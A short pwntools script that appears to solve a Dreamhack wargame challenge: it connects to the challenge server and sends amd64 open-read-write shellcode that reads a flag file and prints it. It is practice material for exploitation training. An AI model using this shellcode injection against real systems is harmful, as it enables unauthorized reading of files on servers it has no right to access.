from pwn import *

p = remote("host3.dreamhack.games", 23947)
context(arch="amd64", os="linux")

shellcode = ''
shellcode += shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

print(p.recv())
p.sendline(asm(shellcode))
print(p.recv())
